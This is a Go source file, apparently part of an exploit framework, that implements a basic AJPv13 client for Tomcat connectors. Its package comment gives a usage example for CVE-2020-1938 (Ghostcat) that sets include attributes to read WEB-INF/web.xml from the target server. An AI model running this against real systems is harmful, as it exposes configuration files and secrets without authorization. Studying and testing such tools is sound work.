// Package ajp is a very basic (and incomplete) implementation of the AJPv13 protocol. This implementation is
// enough to send and receive GET requests. Usage example (CVE-2020-1938):
//
//	attributes := []string{
//		"javax.servlet.include.request_uri",
//		"/",
//		"javax.servlet.include.path_info",
//		"WEB-INF/web.xml",
//		"javax.servlet.include.servlet_path",
//		"/",
//	}
//
//	status, data, ok := ajp.SendAndRecv(conf.Rhost, conf.Rport, conf.SSL, "/"+random.RandLetters(12), "GET", []string{}, attributes)
//	if !ok {
//		return false
//	}
//	if status != 200 {
//		return false
//	}
//
// For details on the protocol see: https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html
package ajp

import (
	"encoding/binary"
	"net"
	"strings"

	"github.com/vulncheck-oss/go-exploit/output"
	"github.com/vulncheck-oss/go-exploit/protocol"
	"github.com/vulncheck-oss/go-exploit/transform"
)

type method byte

const (
	OPTIONS method = 1
	GET     method = 2
	HEAD    method = 3
	POST    method = 4
	PUT     method = 5
	DELETE  method = 6
)

type reqType byte

const (
	FORWARD  reqType = 2
	SHUTDOWN reqType = 7
	PING     reqType = 8
	CPING    reqType = 10
)

type respType byte

const (
	SENDBODYCHUNK respType = 3
	SENDHEADERS   respType = 4
	ENDRESPONSE   respType = 5
)

type definedHeaders uint16

const (
	ACCEPT         definedHeaders = 0xa001
	ACCEPTCHARSET  definedHeaders = 0xa002
	ACCEPTENCODING definedHeaders = 0xa003
	ACCEPTLANGUAGE definedHeaders = 0xa004
	AUTHORIZATION  definedHeaders = 0xa005
	CONNECTION     definedHeaders = 0xa006
	CONTENTTYPE    definedHeaders = 0xa007
	CONTENTLENGTH  definedHeaders = 0xa008
	COOKIE         definedHeaders = 0xa009
	COOKIE2        definedHeaders = 0xa00a
	HOST           definedHeaders = 0xa00b
	PRAGMA         definedHeaders = 0xa00c
	REFERER        definedHeaders = 0xa00d
	USERAGENT      definedHeaders = 0xa00e
)

// A data structure for holding Forward Request data before serialization.
type ForwardRequest struct {
	prefixCode int
	method     method
	protocol   string
	reqURI     string
	remoteAddr string
	remoteHost string
	serverName string
	serverPort int
	useSSL     bool
	headers    []string
	attributes []string
}

// Creates a Forward Request struct and default constructs it.
func createForwardRequest(host string, port int, ssl bool, uri string, headers []string, attributes []string) ForwardRequest {
	request := ForwardRequest{}
	request.prefixCode = 0x02
	request.protocol = "HTTP/1.1"
	request.reqURI = uri
	request.remoteAddr = host
	request.remoteHost = ""
	request.serverName = host
	request.serverPort = port
	request.useSSL = ssl
	request.headers = make([]string, 0)

	request.headers = append(request.headers, "host")
	request.headers = append(request.headers, host)
	request.headers = append(request.headers, headers...)

	request.attributes = make([]string, 0)
	request.attributes = append(request.attributes, attributes...)

	return request
}

// Sets the ForwardRequest method to GET and sets the content-length to 0.
func setGetForwardRequest(request *ForwardRequest) {
	request.method = GET
	request.headers = append(request.headers, "content-length")
	request.headers = append(request.headers, "0")
}

// Transforms a string into the AJP binary format.
func appendString(serialized *[]byte, value string) {
	data := *serialized
	if len(value) == 0 {
		data = append(data, "\xff\xff"...)
	} else {
		data = append(data, transform.PackBigInt16(len(value))...)
		data = append(data, value...)
		data = append(data, 0x00)
	}
	*serialized = data
}

// Transforms a bool into the AJP binary format.
func appendBool(serialized *[]byte, value bool) {
	data := *serialized
	if value {
		data = append(data, 1)
	} else {
		data = append(data, 0)
	}
	*serialized = data
}

// Transforms an int into the AJP binary format.
func appendInt(serialized *[]byte, value int) {
	data := *serialized
	data = append(data, transform.PackBigInt16(value)...)
	*serialized = data
}

// Transforms the ForwardRequests struct into a []byte to be sent on the wire.
func serializeForwardRequest(request ForwardRequest) []byte {
	serialized := make([]byte, 0)
	serialized = append(serialized, byte(FORWARD))
	serialized = append(serialized, byte(request.method))
	appendString(&serialized, request.protocol)
	appendString(&serialized, request.reqURI)
	appendString(&serialized, request.remoteAddr)
	appendString(&serialized, request.remoteHost)
	appendString(&serialized, request.serverName)
	appendInt(&serialized, request.serverPort)
	appendBool(&serialized, request.useSSL)
	appendInt(&serialized, len(request.headers)/2)

	// take use provided headers and translate them into AJP pre-defined headers
	for _, header := range request.headers {
		switch header {
		case "accept":
			appendInt(&serialized, int(ACCEPT))
		case "host":
			appendInt(&serialized, int(HOST))
		case "content-length":
			appendInt(&serialized, int(CONTENTLENGTH))
		case "connection":
			appendInt(&serialized, int(CONNECTION))
		case "user-agent":
			appendInt(&serialized, int(USERAGENT))
		default:
			appendString(&serialized, header)
		}
	}

	for i := 0; i < len(request.attributes); i += 2 {
		serialized = append(serialized, 0x0a)
		appendString(&serialized, request.attributes[i])
		appendString(&serialized, request.attributes[i+1])
	}

	// terminate
	serialized = append(serialized, 0xff)

	header := make([]byte, 0)
	header = append(header, 0x12)
	header = append(header, 0x34)
	header = append(header, transform.PackBigInt16(len(serialized))...)
	serialized = append(header, serialized...)

	return serialized
}

// validate the magic received from the server.
func checkRecvMagic(conn net.Conn) bool {
	magic, ok := protocol.TCPReadAmount(conn, 2)
	if !ok {
		return false
	}

	return magic[0] == 0x41 && magic[1] == 0x42
}

// Read a response from the server. Generally: magic, length, <length amount>.
func readResponse(conn net.Conn) (string, bool) {
	if !checkRecvMagic(conn) {
		output.PrintFrameworkDebug("Received invalid magic")

		return "", false
	}

	length, ok := protocol.TCPReadAmount(conn, 2)
	if !ok {
		return "", false
	}
	toRead := int(binary.BigEndian.Uint16(length))
	if toRead == 0 {
		output.PrintFrameworkError("The server provided an invalid message length")

		return "", false
	}

	data, ok := protocol.TCPReadAmount(conn, toRead)
	if !ok {
		return "", false
	}

	return string(data), true
}

// Reads the response from the server. Generally should be: send headers, send body chunk, end response
// return the HTTP status, data, and bool indicating if we were successful or not.
func readRequestResponse(conn net.Conn) (int, string, bool) {
	headers, ok := readResponse(conn)
	if !ok {
		return 0, "", false
	}

	if len(headers) < 10 {
		output.PrintFrameworkError("Received insufficient data")

		return 0, "", false
	}

	if headers[0] != byte(SENDHEADERS) {
		output.PrintFrameworkError("Received unexpected message type")

		return 0, "", false
	}

	status := int(binary.BigEndian.Uint16([]byte(headers[1:3])))

	allData := ""
	for {
		body, ok := readResponse(conn)
		if !ok {
			return status, "", false
		}

		switch body[0] {
		case byte(SENDBODYCHUNK):
			allData += body[3:]
		case byte(ENDRESPONSE):
			return status, allData, true
		default:
			output.PrintFrameworkError("Unexpected message type")

			return status, "", false
		}
	}
}

// Send and recv an AJP message.
// return the HTTP status, data, and bool indicating if we were successful or not.
func SendAndRecv(host string, port int, ssl bool, uri string, verb string, headers []string, attributes []string) (int, string, bool) {
	// validate headers is well formed
	if (len(headers) % 2) != 0 {
		output.PrintFrameworkError("HTTP header key, value should each take an array slot")

		return 0, "", false
	}
	// validate attributes is well formed
	if (len(attributes) % 2) != 0 {
		output.PrintFrameworkError("Attibute key, value should each take an array slot")

		return 0, "", false
	}

	// build the AJP request and transform it depending on the verb
	req := createForwardRequest(host, port, ssl, uri, headers, attributes)
	switch strings.ToLower(verb) {
	case "get":
		setGetForwardRequest(&req)
	default:
		output.PrintFrameworkError("%s is not a currently supported verb", verb)

		return 0, "", false
	}

	// connect to the remote host
	conn, ok := protocol.MixedConnect(host, port, ssl)
	if !ok {
		return 0, "", false
	}

	// serialize the request into it's binary format and yeet it over the wire
	serialized := serializeForwardRequest(req)
	if !(protocol.TCPWrite(conn, serialized)) {
		return 0, "", false
	}

	return readRequestResponse(conn)
}
